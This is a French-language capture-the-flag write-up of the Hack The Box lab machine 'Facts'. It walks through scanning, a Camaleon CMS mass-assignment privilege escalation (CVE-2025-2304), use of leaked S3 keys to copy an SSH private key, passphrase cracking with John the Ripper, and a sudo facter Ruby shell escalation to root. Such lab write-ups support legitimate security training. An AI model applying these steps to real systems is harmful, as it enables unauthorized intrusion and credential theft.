---
date: 2026-06-05T09:51:55-05:00
# description: ""
image: "/images/HTB-Facts/facts.png"
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Linux", "CamaleonCMS", "CVE-2025-2304", "AWS", "S3", "GTFOBins", "Facter"]
categories: ["Red Teaming"]
title: "HTB: Facts"
type: "post"
---


* Platforme: Hack The Box
* Lien: [Facts](https://app.hackthebox.com/machines/Facts)
* Niveau: Facile
* OS: Linux
---

Facts débute par la découverte d'une instance vulnérable du CMS Camaleon affectée par la faille `CVE-2025-2304`, où une faille de type `mass assignment` permet l'escalade des privilèges vers le niveau administrateur. L'accès au tableau de bord du CMS révèle des identifiants MinIO compatibles avec AWS, qui sont utilisés pour recenser les compartiments S3 internes et récupérer une clé privée SSH.

Après avoir cracké la phrase de passe de la clé SSH avec John the Ripper, l'accès est obtenu en tant qu'utilisateur `trivia` via SSH. L'énumération du système identifie ensuite que le binaire `facter` peut être exécuté avec des privilèges sudo, permettant l'exécution de code Ruby arbitraire via l'argument `--custom-dir` et conduisant finalement à une compromission totale de la cible.

# Balayage

```
nmap -p- --open -T4 -sCV -oA nmap/Facts {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 12:26 CST
Nmap scan report for 10.129.108.147
Host is up (0.11s latency).
Not shown: 52251 closed tcp ports (conn-refused), 13281 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)

80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/

54321/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890CFE3B41D5153
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 18:27:10 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1890CFE3B41D5153</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Tue, 03 Feb 2026 18:27:10 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.94SVN%I=7%D=2/3%Time=69823DFE%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Accept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20a
SF:pplication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max
SF:-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x
SF:20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX
SF:-Amz-Request-Id:\x201890CFE3B41D5153\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2003\x20
SF:Feb\x202026\x2018:27:10\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20enc
SF:oding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\
SF:x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><R
SF:equestId>1890CFE3B41D5153</RequestId><HostId>dd9025bab4ad464b049177c95e
SF:b6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions
SF:,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Tue,\x2003\x
SF:20Feb\x202026\x2018:27:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RT
SF:SPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessio
SF:nReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.77 seconds
```

Nmap détecte trois ports ouverts: `SSH` (22), `http` (80) et `MinIO` (54321). Il y a également une redirection vers `facts.htb`.

> [MinIO](https://www.min.io/) est un système de stockage compatible avec Amazon S3.

```
sudo echo "{IP} facts.htb" | sudo tee -a /etc/hosts
```

# Énumération

À l'adresse `http://facts.htb/`, nous trouvons une application web.

![Facts website](/images/HTB-Facts/facts_website.png)

Le bouton `Start Exploring` nous redirige vers `http://facts.htb/animal-ejected`, une page de publication.

![bear post](/images/HTB-Facts/bear_post.png)

En cliquant sur `Page`, on accède à `http://facts.htb/page`, où l'on trouve tous les articles disponibles sur le site web.

![page section](/images/HTB-Facts/page_section.png)

On remarque également que les images des différents articles sont stockées dans le répertoire `http://facts.htb/randomfacts/`, auquel nous n'avons pas accès. Cependant, nous pouvons télécharger des images depuis le site web en accédant à l'adresse spécifique d'une image, telle que `http://facts.htb/randomfacts/animalejected.png` par exemple.

![posts pictures](/images/HTB-Facts/posts_pics.png)

![images directory](/images/HTB-Facts/image_dir.png)

En effectuant une attaque par force brute sur les répertoires, nous trouvons une page de connexion à l'adresse: `http://facts.htb/admin/login`.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://facts.htb
```

![admin directory](/images/HTB-Facts/admin_dir.png)

![admin page](/images/HTB-Facts/admin_page.png)

Nous créons un compte et nous nous connectons. Camaleon CMS est utilisé ici, plus précisément la version `2.9.0`.

![camaleonCMS dashboard](/images/HTB-Facts/camaleonCMS_dashboard.png)

En recherchant les vulnérabilités du CMS Camaleon, nous découvrons le [CVE-2025-2304](https://www.tenable.com/security/research/tra-2025-09). Il s'agit d'une vulnérabilité d'élévation de privilèges via une affectation massive. Elle se produit lorsqu'un utilisateur tente de modifier son mot de passe. En envoyant une requête contenant le paramètre `role`, il est possible d'obtenir des privilèges d'administrateur. 

> Rendez-vous sur votre page de profil pour voir cette option.

![change password feature](/images/HTB-Facts/change_pwd.png)

La faille se trouve dans le `UsersController`, plus précisément dans l'action `updated_ajax` lors des modifications de mot de passe. Le code vulnérable utilise la méthode `permit!`, ce qui est dangereux car elle indique au système d'accepter toutes les clés contenues dans l'objet `password[...]`. 

Comme les paramètres sont transmis directement à `@user.update(...)`, tout champ injecté devient un attribut utilisateur modifiable et, puisque `role` contrôle les privilèges d'un utilisateur, il suffit d'inclure `password[role]=admin` pour obtenir des privilèges d'administrateur.

> La Pull Request en question est disponible [ici](https://github.com/owen2345/camaleon-cms/pull/1109/changes).

![PR_1109 CamaleonCMS](/images/HTB-Facts/PR_1109.png)

> Une démonstration de faisabilité (PoC) de cette faille est disponible [ici](https://github.com/whiteov3rflow/CVE-2025-2304-POC); elle automatise le processus.

![admin access](/images/HTB-Facts/admin_access.png)

# Accès Initial

Après s'être déconnecté puis reconnecté, nous avons désormais accès à davantage de fonctionnalités.

![true admin access](/images/HTB-Facts/true_admin.png)

Dans `Settings` -> `General Site` -> `Filesystem Settings`, on trouve quelques secrets AWS.

![AWS Secrets](/images/HTB-Facts/AWS_secrets.png)

À partir de ces informations, nous énumérons le bucket S3.

```
aws configure --profile facts
```

![AWS Enumeration](/images/HTB-Facts/AWS_enum_setup.png)

Le bucket contient deux répertoires.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls
```

![AWS buckets](/images/HTB-Facts/bucket_dirs.png)

Nous savons déjà que `randomfacts` contient les images du site web. Nous vérifions donc `internal`.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls s3://internal
```

![AWS internal directories](/images/HTB-Facts/internal_dir_S3.png)

Une clé SSH se trouve dans le répertoire `.ssh`.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls s3://internal/.ssh/
```

![SSH key S3](/images/HTB-Facts/S3_ssh_key.png)

Nous copions la clé.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

Nous modifions les permissions du fichier à l'aide de la commande `chmod 600 id_ed25519`, puis nous commençons à interagir avec la clé.

```
ssh-keygen -y -f id_ed25519
```

Cela ne fonctionne pas, car il manque encore la passephrase.

![sshkeygen command](/images/HTB-Facts/sshkeygen.png)

Nous utilisons `ssh2john` pour générer un hachage approprié.

```
/usr/share/john/ssh2john.py id_ed25519 > id_ed25519.txt
```

À l'aide de john, la passephrase `dragonballz` est récupérée.

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.txt
```

![ssh key passphrase](/images/HTB-Facts/key_pwd_facts.png)

En exécutant à nouveau la commande `ssh-keygen -y -f id_ed25519`, nous découvrons que la clé appartient à `trivia`.

Nous connectons maintenant via SSH 
```
ssh -i id_ed25519 trivia@facts.htb
```

![trivia SSH login](/images/HTB-Facts/trivia_SSH.png)

L'utilisateur `trivia` peut accéder au répertoire personnel de `william`, où se trouve le drapeau utilisateur.

![user flag](/images/HTB-Facts/facts_user.png)

# Élévation des privilèges

En exécutant `sudo -l`, nous remarquons que `facter` est exécutable en tant que `root`. Sur [GTFObins](https://gtfobins.org/gtfobins/facter/), nous trouvons un moyen d'exploiter ce binaire. Chaque fois que le binaire est exécuté avec l'argument `--custom-dir`, le premier fichier Ruby présent dans le répertoire est exécuté. Nous pouvons exploiter cette faille pour obtenir un shell avec des privilèges root.

![facter binary](/images/HTB-Facts/facter_bin.png)

1. Créer un répertoire
 
```
mkdir /tmp/kscorpio
```

2. Créer un fichier Ruby dans le répertoire avec le contenu suivant: `exec "/bin/bash"`

```
nano priv.rb
```

3. Exécuter `facter`

```
sudo /usr/bin/facter --custom-dir /tmp/kscorpio
```

Nous obtenons ensuite les privilèges root.

![root access](/images/HTB-Facts/root_access.png)







